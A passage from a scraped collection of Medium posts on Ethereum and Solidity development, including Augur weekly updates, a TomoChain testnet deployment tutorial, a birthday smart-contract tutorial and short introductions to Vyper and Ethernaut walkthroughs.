LibraryThis week our CTO is in the Philippines to train 2 of our offshore developer resource who will be helping us with our Solidity and Truffle work as part of our goal this year is to scale our development efforts. They will hence be able to support not only our core business but also future projects for DigixDAO.Last week, Chris completed work on Dijix by adding the Dijix Attestation plugin\u200a\u2014\u200aa generic data type that includes an \u201cattestation\u201d field and \u201cproofs\u201d field, which will be used for each of the PoA actor types to define what it is they are proving (for example, \u201cI received asset X (and this is it\u2019s metadata), here are 3 documents proving this\u201d. Dijix and it\u2019s plugins are now transpiled into ES5 for compatability.He also wrote a \u2018POA-Genesis\u2019 script, which makes it easy to convert files and data into IPFS-hosted attestations. POA-Geneis can be run from a folder containing a mixture of csv, jpeg, pdf and pngs, and will parse the CSV files, create a data structure of attestations, and pass them into Dijix to be processed into dijix-attestations, dijix-pdfs and dijix-images (along with thumbnails). It then generates a JSON report that can be passed to the PoA contract system and linking. This script means that we can easily generate the initial \u2018genesis\u2019 configuration for the PoA system, and the initial state of DGX 2.0 can be easily understood and configured by non-programmers by editing the CSV file.There was a minor update to doxity to fallback to the old style of `@returns` if it\u2019s not using JSON.He also wrote and executed a multiplexer contract, which can be used for sending ETH or ERC20 tokens to a large number of users in a single transaction. This contract was used to reward those who contributed to the recent survey.Finally, he began work on the (still pending) Proof of Asset API, by integrating the new mock pagination system. This Asset Explorer will be it\u2019s own dapplet and imported into the Marketplace app.", "responses": ""}, {"title": "How to compile, deploy and test a Smart Contract on TomoChain testnet", "author_name": "Sittiphol Phanvilai", "link": "https://medium.com/@nuuneoi/how-to-compile-deploy-and-test-a-smart-contract-on-tomochain-testnet-505eca8c9586?source=search_post", "post_date": "Jun 14, 2018", "readtime": "10 min read", "upvotes": "367", "content": "How to compile, deploy and test a Smart Contract on TomoChain testnetSittiphol PhanvilaiBlockedUnblockFollowFollowingJun 14, 2018This article consists of the example Solidity smart contract source codes and the full instructions to:Setup Truffle, the most popular development framework for Ethereum which also works perfectly for TomoChain.Create a TomoChain wallet.Obtain Wallet\u2019s Backup KeyRequest fund to the created TomoChain wallet.Explore the Block ExplorerCompile and deploy the created smart contract to TomoChain testnet.Connect Metamask to TomoChain testnet.Create a front end website and make it interact with TomoChain smart contract through web3.js.Required KnowledgesTo understand to whole things clearly, you need to have an knowledge on Solidity, Truffle and web3.js. Anyway, even if you don\u2019t, you still can follow the instructions step by step to complete the codelab.What is TomoChain?TomoChain is an Ethereum fork that performs significantly better. Its block time was reduced from 15s to just 2s and the transaction fee is closed to zero.And since it is an Ethereum fork, any development kit or programming language that works for Ethereum will also works for TomoChain!TomoChain is developed by Vietnam blockchain developer who is a former project lead of the famous NEM. Mainnet is expected to be live on Q4'18. Anyway, testnet is now already working and is also already opened to any developer to test their own dApp on it with no cost.Get Started: InstallationThere are two applications that we need to install through npm. The first one is Truffle, the development framework for Ethereum. We will use it to compile and deploy our smart contract to the testnet. And the second one is http-server, we will use it to create a simple http server to test our front-end website.$ npm install -g truffle http-serverAnd then let\u2019s clone tomochain-dapp-example repository to your local machine. All of the required codes are packed inside the repository.$ git clone git@github.com:nuuneoi/tomochain-dapp-example.gitInstall required npm package.$ cd tomochain-dapp-example$ npm installThat\u2019s all. Your compiler toolchain is now ready!Create a TomoChain WalletTo create a TomoChain wallet, just do the following easy steps:Browse to https://wallet.tomocoin.io/Click on + CREATE NEW WALLET button.You will now have a TomoWallet! Address will be shown on the top left area. Write it down somewhere. We will use it in many steps below.Easy, huh?Obtain Wallet\u2019s Backup\u00a0KeyBackup Key is a mnemonic seed representing the private spend key. It is pretty important, without it you will not be able to spend the balance in your address. Just don\u2019t forget to write it down somewhere or your wallet may be lost forever.Browse to https://wallet.tomocoin.io/Click on three dots menu at the right top position and click at SHOW YOUR BACKUP KEY. You will see the dialog popped up like this.Copy the words on the last row and write them down somewhere. (These words are also needed to be put in our source code in the smart contract deployment step below.)Please note that this mnemonic seed has to be kept private. Don\u2019t give it to anyone or post it to the public space otherwise your might lose the entire balance to the bad guy.You could now close the wallet tab since we will not use this site anymore. We just need it to generate an address and obtain the associated backup key.Request fundFund is needed to do stuff like smart contract deployment. Don\u2019t worry, it does not cost you any buck since it is the testnet! You can simply request some fund to be transferred to your wallet in few easy steps:Browse to https://faucet.tomochain.com/Put your wallet address to the textbox and make sure you pass the captcha test and then click on REQUEST 1 TOMO button.Wait for like 5\u201310 seconds and then\u00a0\u2026 tadaaaa. Your wallet should now have 1 TOMO transferred to. Let\u2019s go check it.Explore the Block\u00a0ExplorerTo check to latest balance of the address, let\u2019s do it in Tomoscan a.k.a. the TomoChain block explorer!Browse to https://explorer-testnet.tomochain.com/In the search box on the top right area, enter the address and then press the enter key.The TOMO Balance should be shown as 1 TOMO like this.Tips: Don\u2019t look at the TOMO USD Balance since it may be quite depressing right now.Now your wallet has an enough balance to do the entire things in this tutorial so\u00a0\u2026 let\u2019s go ahead!Compile and deploy the created smart contract to TomoChain testnetThe source code in this git repository is written in Truffle framework which is pretty handy. You can compile and do things in just one command line.Look at the source\u00a0codeThis is a Solidity source code used in this tutorial. You can find it in contracts/SimpleContract.sol file.pragma solidity ^0.4.18;contract SimpleContract {    event BalanceUpdated(uint balance);    uint balance;    constructor() public {        // Set initial balance as 1000        balance = 1000;    }    function setBalance(uint newBalance) public {        // Cap balance to be between 0 to 10000 (inclusive)        require(newBalance <= 10000);        // Set new balance        balance = newBalance;        // Emit an event        emit BalanceUpdated(balance);    }    function getBalance() public view returns(uint) {        return balance;    }}This smart contract is super basic. It allows you to set the public variable balance through setBalance function and you can retrieve the balance by calling getBalance. If you are already familiar with Solidity, you should understand the whole code in no time.CompilingTo compile the source code, just type this command in the repository directory.$ truffle compileThe following result should be shown.Compiling ./contracts/Migrations.sol...Compiling ./contracts/SimpleContract.sol...Writing artifacts to ./build/contractsNow your smart contract has already been compiled. The compiled code are stored in the build directory. You can go check it out if you want to.Setting up the Deployment WalletNow it is almost ready to deploy to the testnet. Anyway, we need to specify the TomoChain wallet to deploy the smart contract first. Of course, the wallet we are going to use is the one that we created in the previous step. Here is the steps toOpen truffle.js file. Here is the content inside.'use strict'var HDWalletProvider = require(\"truffle-hdwallet-provider\");var mnemonic = '<PUT YOUR WALLET BACKUP KEY HERE>';module.exports = {  networks: {    development: {      host: \"127.0.0.1\",      port: 7545,      gas: 4000000,      network_id: \"*\"    },    tomotestnet: {      provider: function() {        return new HDWalletProvider(mnemonic, 'https://testnet.tomochain.com');      },      gas: 1000000,      network_id: 89    }  }};2. Copy the backup key obtained in the previous step and paste it as a value of mnemonic variable.var mnemonic = '<PUT YOUR WALLET BACKUP KEY HERE>';Done. Please note that the tomotestnet network will be used to deploy the smart contract we created. However, if you are familiar with Ganache, you could use the development network to do the local test as well if you want to.DeployingNow it is time to deploy the smart contract to the TomoChain testnet! You can deploy the compiled smart contract using the following command.$ truffle migrate --network tomotestnetHere is the expected result.Using network \u2018tomotestnet\u2019.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x081825424ce179259d661e2cd508b6a3ec5d3c622275168bff3f0d8460348c3f  Migrations: 0x65730da7e39d3787723a8949bc7d41e7f0f013baSaving successful migration to network...  ... 0xd96186343a751f2365d6311d6c7c52d67a86eee04854c40806a628526b0a573aSaving artifacts...Running migration: 2_deploy_contracts.js  Deploying SimpleContract...  ... 0xe80a4bac1ebbfcdd5170d469aa3998f1ee292227b3c7fa677e108135a7feb705  SimpleContract: 0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4beSaving successful migration to network...  ... 0x1397e27ad32783349568f65397e81f54dd3b1c36aa9405f06a804b271a23a88cSaving artifacts...Don\u2019t be surprise if those hex code are not the same as mine since they would be different for each person.It is worth noting that the long hex code are the TxHash while the short one are contract address. If you want to play around, please feel free to copy those hex code in block explorer and see the details. Anyway, I will not go over those stuffs since it is too details.Alright, although there are a lot of alien stuff printed out right now but actually the only address that we need to use in the further step is 0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4be which is the contract address of SimpleContract we created. Please note that your contract address will be different than mine so please ignore my address and use yours instead.Go Checking the Deployment TransactionThe deployment steps are actually simply a set of transactions so we can see them on block explorer. So\u00a0\u2026 let\u2019s go check them out! Just simply go to the Tomoscan page and enter your address. 4 new transactions would be shown like below.No action item on this. Just want you to make sure that your contract deployment has successfully been done on TomoChain testnet.You may already notice that how fast the deployment step above was. It used just around 20 seconds to finish or just 5 seconds for each transaction created to be confirmed. Super fast\u00a0!Connect Metamask to TomoChain testnet.Metamask will be used as a provider to create a transaction and interact with smart contract on the testnet. (As I already mentioned above, everything that works with Ethereum will also work with TomoChain).However, TomoChain is not natively supported on Metamask. We need to manually define the custom rpc server for TomoChain testnet. Here is the steps to do:Install Metamask for Chrome2. Click on the Metamask icon on address bar. Click on the top left menu and choose Custom RPC3. Type https://testnet.tomochain.com in the RPC textbox and then click Save4. Click on Restore from seed phrase and put the mnemonic from above step to the Wallet Seed text area. Also don\u2019t forget to set the password to protect the wallet from people who share the computer with you.5. You should now be good. The wallet supposes to be shown correctly in both address and balance.Please note that the unit of the wallet here is TOMO but since Metamask does not know TOMO so it just shows as ETH as you can see above.Congratulations! Metamask is now ready to interact with TomoChain testnet!Create a Front-End Website Interacting with the Smart\u00a0ContractSimple demo website used to interact with the deployed smart contract has also come along with tomochain-dapp-example repository. You can find it in web directory. The only file you need to work with is index.html. The web is almost ready to run but still need some modification. Please do the following steps.Find the abi json value from build/contracts/SimpleContract.json, copy it and replace the abi value in index.html with that json array, for example,.var abi = [    {      \"inputs\": [],      \"payable\": false,      \"stateMutability\": \"nonpayable\",      \"type\": \"constructor\"    },    {      \"anonymous\": false,      \"inputs\": [        {          \"indexed\": false,          \"name\": \"balance\",          \"type\": \"uint256\"        }      ],      \"name\": \"BalanceUpdated\",      \"type\": \"event\"    },    {      \"constant\": false,      \"inputs\": [        {          \"name\": \"newBalance\",          \"type\": \"uint256\"        }      ],      \"name\": \"setBalance\",      \"outputs\": [],      \"payable\": false,      \"stateMutability\": \"nonpayable\",      \"type\": \"function\"    },    {      \"constant\": true,      \"inputs\": [],      \"name\": \"getBalance\",      \"outputs\": [        {          \"name\": \"\",          \"type\": \"uint256\"        }      ],      \"payable\": false,      \"stateMutability\": \"view\",      \"type\": \"function\"    }  ];2. Replace the contract address with your own SimpleContract contract address, for example,var contractAddress = '0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4be';3. Source code is now ready. Now it is time to spin up the http server by going to Terminal and type the following command.$ cd web$ http-server .The server is now launched on port 8080. You can now browse to the web created through browser at http://localhost:8080 and give a test!TestOnce opened, front-end web will immediately call getBalance() function and show the result in the above area.You can input the new balance you need and click at Set New Balance button to set the new value.And since this operation requires Metamask to create and sign a transaction for you, Metamask will be automatically launched with the predefined parameter calling to setBalance() function on the deployed smart contract. Please feel free to review those Tx parameter and then just simply click on SUBMIT button.The transaction progress will be updated in the below area. You can also view the transaction information from the TxHash row if you want to.It is worth noting that the transaction is consistency confirmed in just 4\u20135 seconds after your Tx has been created which is super fast!! (2 seconds of block time and 2-3 seconds of network latency.)Congratulations! Your first smart contract is now deployed on TomoChain testnet and you can also interact with it through simple web3.js provider on web front-end!Sorry for not going over the front-end source code because I am afraid that it would be too much. However, the source code is not so complicated, please feel free to review it yourself!AuthorTutorial created by Sittiphol Phanvilai (nuuneoi)", "responses": ""}, {"title": "Augur Weekly Development Update\u200a\u2014\u200aDecember\u00a013th", "author_name": "Augur", "link": "https://medium.com/@AugurProject/augur-weekly-development-update-december-13th-c10f63ad825f?source=search_post", "post_date": "Dec 13, 2017", "readtime": "2 min read", "upvotes": "268", "content": "Augur Weekly Development Update\u200a\u2014\u200aDecember\u00a013thAugurBlockedUnblockFollowFollowingDec 13, 2017We published the Solidity Compiler audit report this past week, performed by Sergio Lerner of Coinspect. It\u2019s important to note that this audit is not for the Augur contracts, but for the Solidity Compiler found in ethereum/solidity. This audit confirms that Solidity is a much stronger foundation to build on over Serpent, with only 10 low-risk issues found, and no medium or high.Solidity Compiler Audit ReportIn September 2017, Augur engaged Coinspect to perform a security audit of the Solidity Compiler. The objective of the\u2026medium.comContract audits are in their final phases. We\u2019re changing a few minor things in the reporting contracts, which are planned to be audited right after delivery of the initial reports. The UI is getting wired up with Augur Node, and dev.augur.net should also be wired up with real data in the coming week.A prior contractor, Tom Haile, is also joining us full time as a full-stack developer! Make sure to say hi to him (@tomhaile) in our chat.", "responses": "1"}, {"title": "More price functions for Token-Bonding Curves", "author_name": "Aventus Network", "link": "https://blog.aventus.io/more-price-functions-for-token-bonding-curves-cfb1ebb5b659?source=search_post", "post_date": "Nov 15, 2018", "readtime": "12 min read", "upvotes": "101", "content": "More price functions for Token-Bonding CurvesAventus NetworkBlockedUnblockFollowFollowingNov 15, 2018Following last week\u2019s article, written by Alexandre Pinto, the author of Arrays in Solidity and Working with Strings in Solidity, today we continue talking about the Token Bonding Curves.", "responses": "1"}, {"title": "Augur Weekly Development Update\u200a\u2014\u200aAugust\u00a09th", "author_name": "Augur", "link": "https://medium.com/@AugurProject/augur-weekly-development-update-august-9th-8306fd99c89f?source=search_post", "post_date": "Aug 10, 2017", "readtime": "2 min read", "upvotes": "74", "content": "Augur Weekly Development Update\u200a\u2014\u200aAugust\u00a09thAugurBlockedUnblockFollowFollowingAug 10, 2017We\u2019re happy to share that the Solidity migration is progressing very well. You can follow its status on GitHub. We\u2019re ~50% done, a bit ahead of schedule. All the reporting contracts have been migrated, with the market contracts next up.Joey gave a talk online with BlockGeeks this past week, where he goes over the Solidity migration status, release schedule, and other details of Augur. His talk has been uploaded below:We\u2019d also like to welcome Serena Randolph to the Augur team! Serena is joining Augur as a front-end developer, where she will be working with our current UI team building the new IDEO designed client. Serena has been a freelance web developer, with clients including IDEO, Netflix and the U.S. State Department. She will be starting in ~2 weeks, make sure to welcome her to the team when you see her in Slack!We wrapped up the REP migration with paying out all EtherDelta and OasisDEX users who had REP tied up in escrow. Any REP locked up in a decentralized exchanges escrow was lost, and required us to manually make those traders whole. It ended up being < ~425 REP, which came from the Forecast Foundation. If you have any questions, please let us know.Our StackExchange is getting a good amount of activity, however more is always better. We need to keep the engagement up in order to prevent the beta proposal from closing. If you\u2019d like to join, shoot us a message on Twitter or in Slack and we can invite you to participate.Augur StackExchangeQ&A for developers, economists and users interested in the open source, decentralized, prediction market, Auguraugur.stackexchange.com", "responses": "1"}, {"title": "Augur Weekly Development Update\u200a\u2014\u200aSeptember 20th", "author_name": "Augur", "link": "https://medium.com/@AugurProject/augur-weekly-development-update-september-20th-9717e17f11f6?source=search_post", "post_date": "Sep 20, 2017", "readtime": "2 min read", "upvotes": "179", "content": "Augur Weekly Development Update\u200a\u2014\u200aSeptember 20thAugurBlockedUnblockFollowFollowingSep 20, 2017Yesterday we published \u201cSolidity Migration & What\u2019s Next\u201d covering the completion of our migration to Solidity, and what is still left in the pipeline before audits / launch:Solidity Migration & What\u2019s NextSix weeks ago Augur and ZeppelinSolutions disclosed an audit of the Serpent compiler, revealing a critical security\u2026medium.comWe are done with the migration (!), and we highly recommend reading the \u201cWhat\u2019s Next\u201d section of the above post to catch up on what we\u2019ll be working on in the coming weeks. There is still a list of tasks to complete, and the new UI client is just about 50% of the way done. Some PR\u2019s were pushed to the new v3 client (dev.augur.net), our docs received an update, and our backend team is working on sifting through remaining tasks.ZeppelinSolutions on the Solidity migration.As we\u2019ve said, the speed of development has increased since the migration, and we\u2019re finding that new employees are easier to onboard at this time than previously. Our team has been growing quite fast, nearing ~18 people including contractors.We\u2019re internally working on scoping out rough timelines and prioritizing the remaining work. The focus is getting a product out to the world. The first version of Augur will not be the full fledged, no-limits launch. We\u2019re assessing what can be backlogged until post launch, to further increase development velocity and get something out sooner.The Forecast Foundation is still looking to fill a DevOps role. We are also always open to discussing contract Solidity work & auditing with experienced developers. Please reach out if you are interested.", "responses": ""}, {"title": "Now open source: friendly multi-signatures for Ethereum\u00a0\ud83d\udd11", "author_name": "Alex Kern", "link": "https://medium.com/dsys/now-open-source-friendly-multi-signatures-for-ethereum-d75ca5a0dc5c?source=search_post", "post_date": "May 29, 2018", "readtime": "2 min read", "upvotes": "357", "content": "Now open source: friendly multi-signatures for Ethereum\u00a0\ud83d\udd11Today we are open sourcing one of the first building blocks for our decentralized identity system, solidity-sigutils.Alex KernBlockedUnblockFollowFollowingMay 29, 2018Signed messages are an increasingly important tool used by decentralized applications. They enable complex access management and delegation patterns and have greater flexibility than raw transactions. Wallet applications such as MetaMask and Toshi support signing transactions via their web3 provider which contracts can verify using ecrecover().In the context of identity management, signed messages play a crucial role in building more secure and accessible wallets. Conventionally, anyone with a user\u2019s private key has full control over their wallet. This is a security vulnerability: any malicious actor with access to the user\u2019s private key can steal all funds.To improve security, it makes sense to require multi-factor approval from more than one device for some or all transactions. A so-called \u201cmultisig identity\u201d often involves a proxy contract that accepts signed transactions from a whitelist of keys. To perform a multisig transaction:Sign: The user signs a transaction message with their private key from multiple devices.Concatenate: The user concatenates the message signatures into a single multi-signature.Verify: The user sends the transaction message and concatenated signatures to their proxy contract, which verifies that enough valid signatures have been provided using solidity-sigutils.Execute: The proxy contract forwards the transaction to the designated contract.Signed messages inherit the security of Ethereum\u2019s web3.personal.sign() and ecrecover(). One important benefit over raw transactions is that users can work with trust-less intermediaries without sharing their private keys. For example, signed messages enable complex transaction funding strategies like gas relays which pay for transaction costs on a user\u2019s behalf. Additionally, identity contracts may choose to use signed messages to implement advanced functionalities such as account recovery logic that does not rely on centralized authorities.solidity-sigutils provides a friendly interface to support the emerging community standards around Ethereum multi-signatures, such as EIP 191 and ERC 1077. It is one part of the Distributed Systems smart contract system, and has a number of uses across a wide range of decentralized applications. We hope you find it useful and contribute! \ud83d\ude0aInterested in joining our team? Check our careers page or drop us a line at careers@distributedsystems.com \ud83d\udea9", "responses": ""}, {"title": "Smart Contract Security Verification Just Got a Whole Lot\u00a0Easier", "author_name": "Bernhard Mueller", "link": "https://medium.com/consensys-diligence/smart-contract-security-verification-just-got-a-whole-lot-easier-66c47020232d?source=search_post", "post_date": "Mar 7", "readtime": "", "upvotes": "221", "content": "Smart Contract Security Verification Just Got a Whole Lot\u00a0EasierBernhard MuellerBlockedUnblockFollowFollowingMar 7This is a very short article because MythX makes it super easy to run security analysis on a Solidity file. Assume you have a smart contract you want to check for vulnerabilities. Further assume the contract file is called epic_fail.sol. Try the following:$ npm install -g sabre-mythx$ sabre epic_fail.solThe output:Note the SWC ID on the right: That\u2019s where you find the description of the bug in the Smart Contract Weakness Classification Registry.If you want full reports beyond the first 3 issues detected, sign up for a free API key. If you want to run analysis on large Truffle projects try Truffle Security.Happy and safe coding!", "responses": "2"}, {"title": "PolicyPal Network Crowdsale Smart Contracts", "author_name": "PAL Network team", "link": "https://medium.com/@palnetwork_/policypal-network-crowdsale-smart-contracts-86abbacf483a?source=search_post", "post_date": "Mar 1, 2018", "readtime": "", "upvotes": "267", "content": "PolicyPal Network Crowdsale Smart ContractsPAL Network teamBlockedUnblockFollowFollowingMar 1, 2018The smart contracts are built upon Solidity code, all of which is publicly available for audit, comment and review.The contracts have also been security audited by the world\u2019s leading auditing agency Chain Security.The Github URL for the code is as follows:Github: https://github.com/policypalnet\u00a0Crowdsale Contract: https://github.com/policypalnet/crowdsale-contract\u00a0Audit Report: https://github.com/policypalnet/crowdsale-contract/blob/master/audit/ChainSecurity_PolicyPal_audit_report_public.pdfFurther Reading:Website: https://policypal.networkTelegram: https://t.me/policypalnetworkTwitter: https://twitter.com/PolicyPalNETBlog: https://medium.com/@policypalnetWhitepaper: https://www.policypal.network/whitepaperDevelopers who are keen to join our team, please contact hr@policypal.com with information pertaining to your past projects.For information on Partnerships, please contact us at: info@policypal.com", "responses": ""}, {"title": "", "author_name": "Xrt Foundation", "link": "https://medium.com/@Xrtfoundation/token-swap-update-46c8df790306?source=search_post", "post_date": "Aug 10, 2018", "readtime": "", "upvotes": "165", "content": "\u201cToken Swap\u00a0Update\u201dXrt FoundationBlockedUnblockFollowFollowingAug 10, 2018", "responses": "1"}, {"title": "Augur Weekly Development Update\u200a\u2014\u200aDecember\u00a06th", "author_name": "Augur", "link": "https://medium.com/@AugurProject/augur-weekly-development-update-december-6th-fdecd7d0400f?source=search_post", "post_date": "Dec 6, 2017", "readtime": "2 min read", "upvotes": "92", "content": "Augur Weekly Development Update\u200a\u2014\u200aDecember\u00a06thAugurBlockedUnblockFollowFollowingDec 6, 2017We\u2019ve received the Solidity compiler report, and intend to publicly disclose it in the coming week. Contract audits are in the final stages, and we should begin receiving feedback and reports over the next two weeks.The UI is being wired up with Augur node, and we\u2019re continually testing our deployments to test networks. We\u2019ve hired Paul Gebheim full time, who you\u2019ll see around as @Paul in our Discord chat. Welcome him to the team if you see him around!Joey did a podcast with Crypto 101 titled \u201cWhat is Augur\u201d, linked below:", "responses": "2"}, {"title": "Making a Birthday Contract.", "author_name": "Keno Leon", "link": "https://medium.com/@k3no/making-a-birthday-contract-858fd3f63618?source=search_post", "post_date": "Dec 5, 2017", "readtime": "4 min read", "upvotes": "43", "content": "Making a Birthday Contract.Intermediate Solidity Ethereum Notes & Development.Keno LeonBlockedUnblockFollowFollowingDec 5, 2017Let\u2019s make a Birthday smart contract in Solidity.Note/selfplug: If you are looking for an introduction to Ethereum, Solidity and Smart Contracts I just published an eBook on getting started:https://www.amazon.com/dp/B078CQ8L7VThe Problem / challenge:To have a contract record it\u2019s birth on the blockchain.To have the contract tell you it\u2019s Birthday.Bonus / Extra Credit: Return the Birthday in a Human Readable way without the need of external UI\u2019s.The contract\u00a0:pragma solidity ^ 0.4.0;contract DateTime {        function getYear(uint timestamp) public constant returns (uint16);        function getMonth(uint timestamp) public constant returns (uint8);        function getDay(uint timestamp) public constant returns (uint8);}contract BirthDay {  uint public bday;  address public dateTimeAddr = 0x8Fc065565E3e44aef229F1D06aac009D6A524e82;  DateTime dateTime = DateTime(dateTimeAddr);  function BirthDay() public  {    bday = now;  }  function getBirthYear() view public returns (uint16){      return dateTime.getYear(bday);  }  function getBirthMonth() view public returns (uint8){      return dateTime.getMonth(bday);  }  function getBirthDay() view public returns (uint8){      return dateTime.getDay(bday);  }}Read the Contract\u00a0:https://kovan.etherscan.io/address/0x86d686cc0e2feaa63834163af8b7a5fb869bb977#readContractDevelopment Notes\u00a0:The first thing this contract does is record it\u2019s birthday via the now native function which is saved into a variable bday by the constructor:uint public bday;function BirthDay() public  {    bday = now;  }As it is a public variable, you get an automagic getter so anyone can consult it\u00a0:bday -> 1512417464 uint256Now, dates in Solidity use timestamps, and if you are a developer you shouldn't have much issue converting this unix timestamp to a human readable date\u2026 But I personally believe it would be useful to provide a human readable date for you could easily consult without having a complex client or wallet.Now in order to do so we will be adding considerable overhead and for some reason it is frowned upon, but this is an excercise so this is what we are going to do:We will use an external contract library to parse the timestamp\u00a0:I'll use Piper Merriam's DateTime contract:https://github.com/pipermerriam/ethereum-datetimeIf you want to check it out or use it I deployed and verified a copy in Kovan:https://kovan.etherscan.io/address/0x8fc065565e3e44aef229f1d06aac009d6a524e822. Calling this library contract.There are multiple ways of calling another contract in solidity depending on what it is you want to accomplish, (read a view, affect state, have an ABI, don\u2019t have one). In this specific case, all we want to do is send a timestamp and get the return value, we also have the ABI in the form of the DateTimesAPI.json found on the repo.The First thing we need is to include our ABI in the form of an abstract contract:contract DateTime {Followed by the function signatures we will use:function getYear(uint timestamp) public constant returns (uint16);function getMonth(uint timestamp) public constant returns (uint8);function getDay(uint timestamp) public constant returns (uint8);}Upon compiling we just feed the :Birthday contract and it will include this one.\u2026The address for our previously deployed DateTime library comes next, it is hardcoded and public although it seems sensible to provide an ownable setter and maybe make it private if need be.address public dateTimeAddr = 0x8Fc065565E3e44aef229F1D06aac009D6A524e82;\u2026The next step is to create a globally accessible contract instance of the DateTime Library at our specific address:DateTime dateTime = DateTime(dateTimeAddr);A tongue twister of a thing that basically says this is an instance of our abstract contract at this address.\u2026And finally we can use our library inside functions like so:function getBirthYear() view public returns (uint16){      return dateTime.getYear(bday);  }The result\u00a0:I really wanted to return a single line in the form of day-month-year, but concatenating multiple returns while calling external functions seems to be a fools errand, so I settled for calling them individually, you can query the contract without any external UI and it returns it\u2019s Birthday in pieces (as well as a timestamp):Wrapping up.This is such an interesting contract, for one having the ability to record a contracts birth inside the same contract allows for all kinds of interesting autonomous applications based on time. ( I actually needed this feature for a future payable contract ).On the other hand there is a considerable degree of sophistication needed to add the human readable date feature via a library call. I personally think that it is worth it as a means to provide the convenience to the end user, but every project is different.We also learned how to call an external contract, something that will surely be useful in future contracts.Best,KenoAbout the Author\u00a0:Born Eugenio Noyola Leon (Keno) I am a Designer,Web Developer/programmer, Artist and Inventor, currently living in Mexico City, you can find me at www.k3no.com", "responses": ""}, {"title": "Augur Weekly Development Update\u200a\u2014\u200aMay\u00a02nd", "author_name": "Augur", "link": "https://medium.com/@AugurProject/augur-weekly-development-update-may-2nd-3b523e160680?source=search_post", "post_date": "May 2, 2018", "readtime": "2 min read", "upvotes": "169", "content": "Augur Weekly Development Update\u200a\u2014\u200aMay\u00a02ndAugurBlockedUnblockFollowFollowingMay 2, 2018Today the Ethereum Foundation Grants Program announced that they will be co-sponsoring an extensive audit of the Solidity compiler with us, performed by Zeppelin. It is planned to begin at the end of May and to run for about sixteen weeks. Augur has no dependency on this audit, and in no way does it effect Augurs development schedule. This is an extra service that we believe should be performed, effecting the entirety of the Ethereum ecosystem.We\u2019ve been putting bounties up on Gitcoin and they\u2019re being completed faster than we had ever imagined! We\u2019ve had Trezor authentication support, one-click Heroku and Digital Ocean deployments, and integration with four separate Solidity analyzers all bountied in under two weeks. Thank you to everybody who\u2019s been participating, we will continue to add more this week.Internally, we\u2019re finalizing launch/deployment details and plan to have an update for the public soon about the process and when it\u2019s going to happen. The REP token contract will need to have its balances frozen and migrated to a new REP token contract for Augur\u2019s launch. There is nothing REP token holders will need to do, with an exception for Ether/ForkDelta, IDEX and OasisDEX users. Full details will come in its own blog post, addressing everything around deployment and the migration process.", "responses": ""}, {"title": "Get Started with Vyper: The Pythonic Ethereum Smart Contract\u00a0Language", "author_name": "Ross Bulat", "link": "https://medium.com/block-journal/get-started-with-vyper-the-pythonic-ethereum-smart-contract-language-e5e58969087e?source=search_post", "post_date": "Nov 12, 2018", "readtime": "12 min read", "upvotes": "143", "content": "Get Started with Vyper: The Pythonic Ethereum Smart Contract\u00a0LanguageGet to know the first real alternative to Solidity smart contractsRoss BulatBlockedUnblockFollowFollowingNov 12, 2018Vyper is a Python 3 derived programming language for Ethereum Smart contracts, and an alternative to Solidity. All Vyper syntax is valid Python 3 syntax, although it has not adopted the entirety of Python 3\u2019s feature set. Vyper is in its early stages of development, but the open source project is available for us to dive into and contribute to right now.This article will outline the real principles and reasons behind Vyper, the differences to Solidity, and various syntax we should be aware of. Finally we will visit the installation process of Vpyer.I personally like the project\u200a\u2014\u200alooking at their example smart contracts is very seducing; they look and feel like Python; the contracts present themselves in a very familiar way Python developers have come to appreciate, and this simplicity is beneficial for reasons we will discuss further down the article.If you would like to familiarise yourself with Solidity as well as Vyper, visit my Solidity on-boarding article aimed at developers to start writing smart contracts with the language:Writing Smart Contracts with Solidity > 0.5A brief walkthrough to start writing Ethereum smart contracts with Solidity 0.5 and abovemedium.com", "responses": "2"}, {"title": "Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly\u00a0opcodes", "author_name": "Nicole Zhu", "link": "https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2?source=search_post", "post_date": "Sep 9, 2018", "readtime": "5 min read", "upvotes": "46", "content": "Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly\u00a0opcodesThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your\u00a0own.Nicole ZhuBlockedUnblockFollowFollowingSep 9, 2018This level requires some assembly programming to deploy a tiny contract to the EVM.", "responses": "2"}, {"title": "Ethernaut Lvl 13 Gatekeeper 1 Walkthrough: How to calculate smart contract gas consumption (and byte\u00a0masking)", "author_name": "Nicole Zhu", "link": "https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009?source=search_post", "post_date": "Sep 4, 2018", "readtime": "5 min read", "upvotes": "38", "content": "Ethernaut Lvl 13 Gatekeeper 1 Walkthrough: How to calculate smart contract gas consumption (and byte\u00a0masking)This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your\u00a0own.Nicole ZhuBlockedUnblockFollowFollowingSep 4, 2018In this level, you estimate gas and mask your bytes to pass three different gates. The concepts behind Gate 1 is explained here in detail.", "responses": "1"}, {"title": "Augur Weekly Development Update\u200a\u2014\u200aSeptember 13th", "author_name": "Augur", "link": "https://medium.com/@AugurProject/augur-weekly-development-update-september-13th-6090eaea69ec?source=search_post", "post_date": "Sep 13, 2017", "readtime": "2 min read", "upvotes": "80", "content": "Augur Weekly Development Update\u200a\u2014\u200aSeptember 13thAugurBlockedUnblockFollowFollowingSep 13, 2017Our migration to Solidity is just about complete (\ud83c\udf89), with one outstanding PR remaining. After this, there will be no more legacy Serpent code in augur-core. The migration took us just about six weeks (our initial estimation), thus keeping us right on track. Next comes completing the remaining fixes and todos in the new Solidity contracts, along with formalizing our deployment processes.The v3 client served at dev.augur.net received a few updates this past week, including the side navigation menus and market preview cards. Ledger and Trezor support for account authentication is in the works. The create market process and market page are up for re skinning next.Augur\u00a0: Main Topics\u00a0PageFeedback and discussion is welcomed in our Slack channel, and questions on our StackOverflow. Some interesting questions this past week have been:\u201cHow do shares within Augur work?\u201d\u201cAre reports retractable before the end of the 